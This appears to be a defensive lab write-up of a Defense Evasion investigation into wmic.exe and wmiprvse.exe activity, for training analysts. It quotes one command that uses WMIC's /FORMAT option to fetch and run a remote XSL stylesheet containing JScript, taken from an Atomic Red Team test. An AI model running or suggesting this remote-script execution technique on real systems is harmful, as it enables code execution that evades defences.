@@ -1,0 +1,36 @@
+Defense Evasion – WMIC Remote XSL JScript Case
+Initial Investigation
+
+Since the case title contains JScript, start the investigation by searching for the JScript keyword.
+
+The search shows a JScript-related process that loads three legitimate DLLs. The Process ID (PID) is 1064.
+
+Image
+
+Process Investigation
+
+Next, search for Process ID 1064 to identify the activity performed by the process.
+
+During the investigation, files were observed being created, along with changes to Internet Settings registry keys. The following command line was also observed:
+
+wmic process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
+
+The command uses WMIC to retrieve and process a remote XSL stylesheet.
+
+Image
+
+WMIPRVSE Activity
+
+The investigation also identified the following process:
+
+wmiprvse.exe -secured -Embedding
+
+This indicates that WMI Provider Host (WMIPrvSE) was used in a secured/isolated environment to perform WMI-related operations.
+
+Image
+
+Overall Activity
+
+In this investigation, wmic.exe was executed with the /FORMAT option to access a remote XSL file. The remote stylesheet was then processed through WMI, while wmiprvse.exe was involved in executing the WMI activity in a secured environment.
+
+The activity is associated with Defense Evasion, as WMIC can be abused to execute or process remote XSL content while blending the activity with legitimate Windows management functionality.
